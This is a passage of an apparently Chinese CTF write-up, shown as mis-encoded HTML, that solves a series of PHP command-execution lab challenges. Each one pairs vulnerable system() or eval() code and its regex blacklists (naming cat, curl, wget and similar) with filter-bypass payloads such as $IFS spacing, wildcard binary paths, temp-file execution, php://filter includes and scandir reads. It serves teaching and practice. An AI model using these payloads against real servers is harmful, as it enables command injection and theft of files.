class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥ç”¨shellé»˜è®¤çš„$IFS</p><p>exp1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac$IFS$9fl?g.php%0a              tac$&#123;IFS&#125;fl?g.php%0a  </span><br></pre></td></tr></table></figure><p>exp2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS`tac$IFS*`%0A</span><br></pre></td></tr></table></figure><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç©ºæ ¼ç¼–ç æˆ%09(éœ€è¦phpç¯å¢ƒ)    &amp;&amp;å®è¡Œä¸¤ä¸ªå‘½ä»¤ï¼ŒåŒæ ·ç¼–ç æ‰§è¡Œ</p><p>exp1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac%09fl?g.php%26%26ls</span><br></pre></td></tr></table></figure><p>exp2ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡å•¥å½±å“ï¼ŒåŒä¸Š</p><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡å•¥å½±å“ï¼Œå¯è§å°å‘½ä»¤æ˜¯æ²¡å¤´çš„ï¼Œä¸å¦‚å°ç¬¦å·æ¥çš„æœ‰å¨åŠ›</p><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡å•¥å½±å“ï¼Œå› ä¸ºurlç¼–ç åœ¨æœåŠ¡å™¨è§£ç åï¼Œä»–æ¥å—åˆ°çš„å­—ç¬¦å¹¶æ²¡æœ‰%äº†</p><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>expï¼šåˆ©ç”¨æ­¤æ—¶ä¸èƒ½ç”¨ï¼Ÿé€šé…ç¬¦äº†ï¼Œä¸æ”¯æŒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒä¸Š</p><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆå¼€å¯äº†$</p><p>ç›´æ¥æ¥exp1ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl$&#123;IFS&#125;fla?.php||ls</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/dd060d9eaab845f4a240fc8b83c355a0.png" alt="img"></p><p>å‘ç°flagæ˜¯å‡çš„æ ¹ç›®å½•åº•ä¸‹è¿˜æœ‰ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl$&#123;IFS&#125;/fla?%7C%7Cls</span><br></pre></td></tr></table></figure><p>exp2ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl$IFS/fla&#x27;&#x27;g||</span><br></pre></td></tr></table></figure><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp1ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl$&#123;IFS&#125;fla?.php||ls</span><br></pre></td></tr></table></figure><p>exp2ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x27;&#x27;at$&#123;IFS&#125;fla&#x27;&#x27;g.p&#x27;&#x27;hp</span><br></pre></td></tr></table></figure><p>exp3ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at$&#123;IFS&#125;fla\g.p&#x27;&#x27;hp</span><br></pre></td></tr></table></figure><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœŸbtï¼Œè¿™ä¸€æŠŠflagä¸å¥½ç©äº†</p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;z.txt</span><br><span class="line">è®¿é—®/z.txt</span><br></pre></td></tr></table></figure><h2 id="web55-a-z"><a href="#web55-a-z" class="headerlink" title="web55([a-z])"></a>web55([a-z])</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ç‚«æŠ€æˆ‘å¹²å•¥ï¼Ÿè¶Šæ¥è¶Šä¸§å¿ƒç—…ç‹‚äº†ï¼Œå­—æ¯ä¸€ä¸ªä¸è®©ç”¨ï¼Œå»å­¦ä¹ ä¸€ä¸‹æ–°æ»´å§¿åŠ¿</p><p>çœ‹äº†wpçœ¼ç•Œå¼€é˜”äº†å¥½å¤šï¼Œåœ¨è¿™é‡Œè´´ä¸¤ç¯‡æ–‡ç« </p><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><h3 id="æ‰§è¡Œä¸´æ—¶å­˜å‚¨æ–‡ä»¶"><a href="#æ‰§è¡Œä¸´æ—¶å­˜å‚¨æ–‡ä»¶" class="headerlink" title="æ‰§è¡Œä¸´æ—¶å­˜å‚¨æ–‡ä»¶"></a>æ‰§è¡Œä¸´æ—¶å­˜å‚¨æ–‡ä»¶</h3><p>å¤§è‡´æ˜ç™½äº†æ„æ€ï¼Œå¼€å¯è®¾ç½®åï¼Œphpåœ¨æ¥å—åˆ°æœªçŸ¥çš„æ–‡ä»¶æ—¶ï¼Œä¼šä¸´æ—¶å‚¨å­˜åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå†™ä¸€ä¸ªæœ¨é©¬å¹¶å°†å…¶æ‰§è¡Œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=.+/???/????????[@-[]</span><br></pre></td></tr></table></figure><p>æ¨¡ä»¿å­˜å‚¨è·¯å¾„çš„æ ¼å¼å¹¶ç”¨. å°†å…¶æ‰§è¡Œã€‚æ³¨æ„ï¼šé€šè¿‡<code>.</code>å»æ‰§è¡Œshå‘½ä»¤ä¸éœ€è¦æœ‰æ‰§è¡Œæƒé™</p><p><img src="https://img-blog.csdnimg.cn/28ee76cde6404a0fb58f2b1951362c64.png" alt="img"></p><h3 id="base64æµ"><a href="#base64æµ" class="headerlink" title="base64æµ"></a>base64æµ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br><span class="line">#/bin/base64 flag.php</span><br></pre></td></tr></table></figure><h3 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h3><p>bzip2çš„ä½¿ç”¨<br>bzip2æ˜¯linuxä¸‹é¢çš„å‹ç¼©æ–‡ä»¶çš„å‘½ä»¤<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥å‘½ä»¤å‹ç¼©flag.php ç„¶åè¿›è¡Œä¸‹è½½<br>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/???/????2 ????.???</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯/usr/bin/bzip2 flag.php<br>ç„¶åè®¿é—®/flag.php.bz2è¿›è¡Œä¸‹è½½è·å¾—flag.php</p><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒä¸Šè¿°æ–¹æ³•</p><h2 id="web57"><a href="#web57" class="headerlink" title="web57($(()))"></a>web57($(()))</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ</span><br><span class="line">//flag in 36.php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;</span><br><span class="line">        system(&quot;cat &quot;.$c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–°å§¿åŠ¿ $(())æ˜¯0</p><blockquote><p>å–å0å–åæ˜¯-1<br>å¯¹äºæœ‰ç¬¦å·æ•´æ•°ï¼Œå‡è®¾2byte<br>0000 0000 0000 0000<br>~0000 0000 0000 0000<br>-&gt;<br>1111 1111 1111 1111<br>########åˆ†å‰²çº¿########<br>å˜æ¢æˆæˆ‘ä»¬çš„æ•´æ•°å°±æ˜¯å–å+1<br>ç”±äºæœ€é«˜ä½æ˜¯1ï¼Œæ‰€ä»¥æ˜¯è´Ÿæ•°<br>~1111 1111 1111 1111 + 1 = 1<br>ä¹Ÿå°±æ˜¯-1</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$((~$(())))</span><br><span class="line">-1</span><br><span class="line">æ36ä¸ª-1ç›¸åŠ ç„¶åå–åå°±å¯</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure><h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>systemå‡½æ•°è¢«æ¯™äº†</p><p>exp1ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure><p>exp2ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><p>åŒä¸Š</p><h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><p>æºç ä¸€æ ·å¯èƒ½å¤šäº†è¿‡æ»¤çš„ä¸œè¥¿</p><p>ä¸€ç›´ç©é‚£ä¸¤ä¸ªä¸€æˆä¸å˜ï¼Œè¯•è¯•include</p><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">postï¼š</span><br><span class="line">c=include%0a$_GET[1];</span><br><span class="line">getï¼š</span><br><span class="line">1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><p>æºç ä¸€æ ·å¯èƒ½å¤šäº†è¿‡æ»¤çš„ä¸œè¥¿</p><p>åŒä¸Š</p><h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¿™é¢˜æ²¡å•¥å¥½è¯´çš„ç›´æ¥æ‰”expï¼š</span><br><span class="line">c=include(&#x27;flag.php&#x27;);echo $flag;</span><br></pre></td></tr></table></figure><h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><p>exp2ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;flag.php&#x27;);var_dump(get_defined_vars());</span><br></pre></td></tr></table></figure><h2 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h2><p>ä¸Šè¿°æ–¹æ³•ä¾ç„¶ å¯ä»¥å†æ­¤æ€»ç»“ä¸€ä¸‹æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(&#x27;.&#x27;));</span><br><span class="line">rename(&#x27;flag.php&#x27;,&#x27;1.txt&#x27;)</span><br><span class="line">curlå‡½æ•°ä¼ å‚(ssrf)</span><br><span class="line">é«˜äº®å’Œshow_source</span><br><span class="line">æ–‡ä»¶åŒ…å«</span><br><span class="line">file_get_contents()</span><br></pre></td></tr></table></figure><h2 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h2><p>ä¸Šé¢çš„æ–¹æ³•ä¾ç„¶å¯ä»¥</p><h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p>ç¦æ‰äº†show_source()</p><p>ä½¿ç”¨highlight_file(â€˜flag.phpâ€™)</p><p><img src="https://img-blog.csdnimg.cn/068b05aad5134b25868f134d54fa338e.png" alt="img"></p><p>æŸ¥çœ‹æ ¹ç›®å½•ä¸‹æ–‡ä»¶å†…å®¹ï¼Œå‘ç°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c69c3c950edd4ad283171aca10480935.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>åŒä¸Š</p><h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p><img src="https://img-blog.csdnimg.cn/f3742783fac644ce8b7fdd12ed9e7f4e.png" 